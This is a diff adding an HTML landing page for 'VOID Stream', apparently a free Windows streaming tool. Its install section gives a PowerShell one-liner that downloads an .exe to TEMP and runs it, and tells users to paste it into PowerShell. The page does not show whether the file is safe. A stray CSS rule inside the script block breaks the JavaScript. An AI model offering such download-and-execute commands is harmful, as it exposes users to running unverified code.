@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VOID Stream — Live Studio</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--purple:#7c5af7;--bg:#0a0a12;--card:#12121e;--text:#e0e0ff;--muted:#6060a0;--green:#22c55e}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse 70% 60% at 20% 50%,rgba(124,90,247,.12),transparent 70%),radial-gradient(ellipse 60% 50% at 80% 50%,rgba(56,189,248,.08),transparent 70%);pointer-events:none}
+
+nav{position:fixed;top:0;left:0;right:0;z-index:100;padding:14px 48px;display:flex;align-items:center;background:rgba(10,10,18,.8);backdrop-filter:blur(12px);border-bottom:1px solid rgba(124,90,247,.12)}
+.nav-logo{display:flex;align-items:center;gap:10px;font-size:18px;font-weight:900;letter-spacing:2px}
+.logo-box{width:32px;height:32px;background:linear-gradient(135deg,var(--purple),#5a3abf);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:900;color:#fff}
+.nav-sp{flex:1}
+.nav-link{color:var(--muted);text-decoration:none;font-size:14px;transition:color .15s}
+.nav-link:hover{color:var(--text)}
+
+.hero{position:relative;z-index:1;text-align:center;padding:160px 24px 80px}
+.badge{display:inline-block;padding:5px 16px;border-radius:20px;background:rgba(124,90,247,.15);border:1px solid rgba(124,90,247,.3);color:var(--purple);font-size:12px;font-weight:700;letter-spacing:.5px;margin-bottom:24px}
+h1{font-size:clamp(52px,8vw,92px);font-weight:900;letter-spacing:-2px;margin-bottom:16px;background:linear-gradient(135deg,#fff 30%,var(--purple));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1}
+.tagline{font-size:20px;color:var(--muted);margin-bottom:48px;max-width:540px;margin-left:auto;margin-right:auto;line-height:1.5}
+
+.btn-group{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-bottom:16px}
+.btn-dl{display:inline-flex;align-items:center;gap:8px;padding:16px 36px;border-radius:12px;background:var(--purple);color:#fff;text-decoration:none;font-size:17px;font-weight:800;transition:all .15s;border:none;cursor:pointer}
+.btn-dl:hover{background:#6a4ae0;transform:translateY(-2px);box-shadow:0 8px 32px rgba(124,90,247,.4)}
+.btn-ghost{display:inline-flex;align-items:center;gap:8px;padding:16px 32px;border-radius:12px;background:transparent;color:var(--text);text-decoration:none;font-size:15px;font-weight:600;border:1px solid rgba(255,255,255,.12);transition:all .15s}
+.btn-ghost:hover{border-color:var(--purple);color:var(--purple)}
+.dl-note{font-size:13px;color:var(--muted)}
+
+/* Preview mockup */
+.preview{max-width:900px;margin:0 auto 80px;position:relative;z-index:1;padding:0 24px}
+.preview-frame{background:#12121e;border:1px solid rgba(124,90,247,.25);border-radius:16px;overflow:hidden;box-shadow:0 0 80px rgba(124,90,247,.2)}
+.preview-bar{background:#0d0d1a;padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(255,255,255,.06)}
+.dot{width:10px;height:10px;border-radius:50%}
+.preview-body{display:flex;height:420px;background:#0a0a12}
+.prev-sidebar{width:180px;border-right:1px solid rgba(255,255,255,.06);padding:12px 0;display:flex;flex-direction:column;gap:4px}
+.prev-item{padding:8px 14px;font-size:12px;color:var(--muted);display:flex;align-items:center;gap:8px;border-radius:6px;margin:0 6px}
+.prev-item.on{background:rgba(124,90,247,.15);color:#fff;border:1px solid rgba(124,90,247,.3)}
+.prev-canvas{flex:1;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
+.prev-canvas-inner{width:85%;aspect-ratio:16/9;border-radius:8px;background:#000;position:relative;overflow:hidden;border:1px solid rgba(124,90,247,.2);box-shadow:0 0 30px rgba(124,90,247,.15)}
+.prev-glow{position:absolute;inset:0;background:radial-gradient(circle at 30% 50%,rgba(124,90,247,.15),transparent 60%),radial-gradient(circle at 70% 50%,rgba(56,189,248,.08),transparent 60%)}
+.prev-cam{position:absolute;bottom:8%;right:3%;width:25%;aspect-ratio:16/9;border-radius:6px;background:linear-gradient(135deg,#1a1a2e,#2a2a4a);border:2px solid rgba(124,90,247,.6);box-shadow:0 0 15px rgba(124,90,247,.4)}
+.prev-person{width:100%;height:100%;background:linear-gradient(180deg,#2a2a4a,#1a1a2e);border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:24px;opacity:.6}
+.prev-border{position:absolute;inset:0;border:3px solid;border-image:linear-gradient(135deg,rgba(124,90,247,.8),rgba(56,189,248,.4)) 1;animation:glowBorder 3s ease-in-out infinite}
+@keyframes glowBorder{0%,100%{filter:brightness(1)}50%{filter:brightness(1.4)}}
+.prev-tmpl{position:absolute;right:10px;top:0;bottom:0;width:160px;display:flex;flex-direction:column;gap:5px;justify-content:center}
+.prev-t{border:2px solid rgba(255,255,255,.08);border-radius:6px;height:52px;cursor:pointer;transition:all .2s}
+.prev-t:nth-child(1){border-color:var(--purple);box-shadow:0 0 10px rgba(124,90,247,.3)}
+.prev-t:nth-child(1) .tc{background:linear-gradient(135deg,#0a0014,#7c5af7)}
+.prev-t:nth-child(2) .tc{background:linear-gradient(135deg,#00081a,#38bdf8)}
+.prev-t:nth-child(3) .tc{background:linear-gradient(135deg,#0a0500,#f97316)}
+.prev-t:nth-child(4) .tc{background:linear-gradient(135deg,#000800,#22c55e)}
+.tc{height:100%;border-radius:4px}
+.tl{font-size:8px;color:var(--muted);text-align:center;padding:2px}
+.prev-bar2{background:#0d0d1a;padding:10px 16px;display:flex;align-items:center;gap:8px;border-top:1px solid rgba(255,255,255,.06)}
+.tr-chip{padding:5px 11px;border-radius:6px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.04);font-size:10px;font-weight:700;color:var(--muted)}
+.tr-chip.on{border-color:var(--purple);background:rgba(124,90,247,.2);color:#fff}
+.live-btn{margin-left:auto;padding:6px 16px;border-radius:6px;background:var(--green);color:#fff;font-size:11px;font-weight:800;border:none;cursor:pointer}
+
+/* Features */
+.features{position:relative;z-index:1;padding:40px 24px 80px;max-width:1100px;margin:0 auto}
+.features h2{text-align:center;font-size:34px;font-weight:800;margin-bottom:48px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}
+.card{background:var(--card);border:1px solid rgba(124,90,247,.15);border-radius:14px;padding:24px;transition:border-color .2s}
+.card:hover{border-color:rgba(124,90,247,.4)}
+.card-icon{font-size:28px;margin-bottom:12px}
+.card h3{font-size:16px;font-weight:700;margin-bottom:6px}
+.card p{font-size:13px;color:var(--muted);line-height:1.6}
+
+/* Install */
+.install{position:relative;z-index:1;padding:40px 24px 80px;max-width:680px;margin:0 auto;text-align:center}
+.install h2{font-size:34px;font-weight:800;margin-bottom:12px}
+.install p{color:var(--muted);margin-bottom:28px;font-size:15px}
+.cmd-box{background:#08081a;border:1px solid rgba(124,90,247,.35);border-radius:12px;overflow:hidden;text-align:left;margin-bottom:12px}
+.cmd-hdr{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;background:rgba(124,90,247,.1);border-bottom:1px solid rgba(124,90,247,.15)}
+.cmd-lbl{font-size:11px;font-weight:700;color:var(--purple);letter-spacing:1.5px;text-transform:uppercase}
+.cmd-copy{background:rgba(124,90,247,.2);border:1px solid rgba(124,90,247,.4);color:var(--purple);padding:3px 12px;border-radius:5px;font-size:11px;font-weight:700;cursor:pointer;transition:all .15s}
+.cmd-copy:hover{background:var(--purple);color:#fff}
+.cmd-copy.ok{background:#22c55e;border-color:#22c55e;color:#fff}
+.cmd-text{display:block;padding:14px;font-family:'Consolas','Courier New',monospace;font-size:11px;color:#b0b0e0;word-break:break-all;line-height:1.7;cursor:text;user-select:all}
+.ps-hint{font-size:12px;color:var(--muted)}
+.ps-hint b{color:var(--text)}
+
+footer{position:relative;z-index:1;text-align:center;padding:28px;border-top:1px solid rgba(255,255,255,.06);color:var(--muted);font-size:13px}
+footer a{color:var(--purple);text-decoration:none}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-logo"><div class="logo-box">▲</div>VOID STREAM</div>
+  <div class="nav-sp"></div>
+  <a href="#features" class="nav-link" style="margin-right:24px">Features</a>
+  <a href="#install" class="nav-link">Install</a>
+</nav>
+
+<section class="hero">
+  <div class="badge">🎥 FREE LIVE STREAMING STUDIO</div>
+  <h1>VOID Stream</h1>
+  <p class="tagline">Professional live streaming with glow templates, cinematic transitions, and real-time effects. For Discord, WhatsApp, TikTok, YouTube — everywhere.</p>
+  <div class="btn-group">
+    <a href="https://github.com/orelazugi1-code/void-discord/releases/latest/download/VOID-Stream.exe" class="btn-dl" download id="dl-btn">⬇ Download for Windows</a>
+    <a href="#install" class="btn-ghost">⌨ PowerShell Install</a>
+  </div>
+  <p class="dl-note">Windows 10/11 · Free · Portable (no install needed)</p>
+</section>
+
+<!-- App mockup -->
+<div class="preview">
+  <div class="preview-frame">
+    <div class="preview-bar">
+      <div class="dot" style="background:#ef4444"></div>
+      <div class="dot" style="background:#f97316"></div>
+      <div class="dot" style="background:#22c55e"></div>
+      <span style="font-size:11px;color:#6060a0;margin-left:8px;font-weight:700;letter-spacing:1px">VOID STREAM</span>
+      <span style="margin-left:10px;background:#ef4444;color:#fff;font-size:9px;font-weight:700;padding:2px 7px;border-radius:6px;animation:lp 1.5s infinite">● LIVE</span>
+    </div>
+    <div class="preview-body">
+      <div class="prev-sidebar">
+        <div style="padding:6px 14px;font-size:9px;font-weight:700;letter-spacing:1.5px;color:#4040a0;text-transform:uppercase">Sources</div>
+        <div class="prev-item on">📹 Camera</div>
+        <div class="prev-item">🖥️ Screen</div>
+        <div style="height:1px;background:rgba(255,255,255,.06);margin:6px 12px"></div>
+        <div style="padding:6px 14px;font-size:9px;font-weight:700;letter-spacing:1.5px;color:#4040a0;text-transform:uppercase">Templates</div>
+        <div class="prev-item on" style="font-size:11px">🟣 Neon Purple</div>
+        <div class="prev-item" style="font-size:11px">🔵 Neon Blue</div>
+        <div class="prev-item" style="font-size:11px">🔥 Fire</div>
+        <div class="prev-item" style="font-size:11px">💚 Gaming</div>
+      </div>
+      <div class="prev-canvas">
+        <div class="prev-canvas-inner">
+          <div class="prev-glow"></div>
+          <div class="prev-border"></div>
+          <div class="prev-cam"><div class="prev-person">👤</div></div>
+        </div>
+      </div>
+    </div>
+    <div class="prev-bar2">
+      <span style="font-size:9px;color:#4040a0;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-right:6px">TRANSITION</span>
+      <div class="tr-chip on">⬛ Fade</div>
+      <div class="tr-chip">▶ Slide</div>
+      <div class="tr-chip">🔍 Zoom</div>
+      <div class="tr-chip">⚡ Glitch ▾</div>
+      <div class="tr-chip">💧 Blur</div>
+      <div class="tr-chip">🌀 Spin</div>
+      <button class="live-btn">📺 START LIVE</button>
+    </div>
+  </div>
+</div>
+
+<section class="features" id="features">
+  <h2>Everything you need to go live</h2>
+  <div class="grid">
+    <div class="card"><div class="card-icon">🎨</div><h3>6 Glow Templates</h3><p>Neon Purple, Blue, Fire, Gaming Green, Minimal — all with animated pulsing borders.</p></div>
+    <div class="card"><div class="card-icon">⚡</div><h3>10 Glitch Transitions</h3><p>Classic, RGB Split, VHS, Pixelate, Static, Neon Flash, Digital, Wave, Burn, VOID Logo — each with its own sound effect.</p></div>
+    <div class="card"><div class="card-icon">📹</div><h3>Camera + Screen Mix</h3><p>Full camera, screen only, or PiP mode with camera in any corner. Switch layouts instantly.</p></div>
+    <div class="card"><div class="card-icon">🎙</div><h3>Mic Selector</h3><p>Choose any connected microphone with live level meter. Mute with one click during live.</p></div>
+    <div class="card"><div class="card-icon">📺</div><h3>VOID Live Window</h3><p>Clean output window — share it in Discord, WhatsApp, Zoom. Others see only your stream, not the controls.</p></div>
+    <div class="card"><div class="card-icon">🌐</div><h3>Works Everywhere</h3><p>Use with OBS Virtual Camera for TikTok, YouTube, Instagram Live. Or share directly in Discord/WhatsApp.</p></div>
+  </div>
+</section>
+
+<section class="install" id="install">
+  <h2>Install VOID Stream</h2>
+  <p>Download the .exe directly or use PowerShell to install automatically.</p>
+  <div class="cmd-box">
+    <div class="cmd-hdr">
+      <span class="cmd-lbl">PowerShell</span>
+      <button class="cmd-copy" id="copyBtn" onclick="copyCmd()">📋 Copy</button>
+    </div>
+    <code class="cmd-text" id="cmdText">$f="$env:TEMP\VOID-Stream.exe"; iwr "https://orelazugi1-code.github.io/void-discord/stream/VOID-Stream.exe" -OutFile $f -UseBasicParsing; Start-Process $f</code>
+  </div>
+  <p class="ps-hint">Press <b>Win+R</b> → type <b>powershell</b> → paste the command → Enter</p>
+</section>
+
+<footer>
+  <p>VOID Stream — Free live streaming studio · <a href="https://github.com/orelazugi1-code">GitHub</a></p>
+</footer>
+
+<script>
+function copyCmd() {
+    const t = document.getElementById('cmdText').textContent;
+    const btn = document.getElementById('copyBtn');
+    navigator.clipboard.writeText(t).then(() => {
+        btn.textContent = '✓ Copied!'; btn.classList.add('ok');
+        setTimeout(() => { btn.textContent = '📋 Copy'; btn.classList.remove('ok'); }, 2000);
+    });
+}
+@keyframes lp{0%,100%{opacity:1}50%{opacity:.5}}
+</script>
+</body>
+</html>
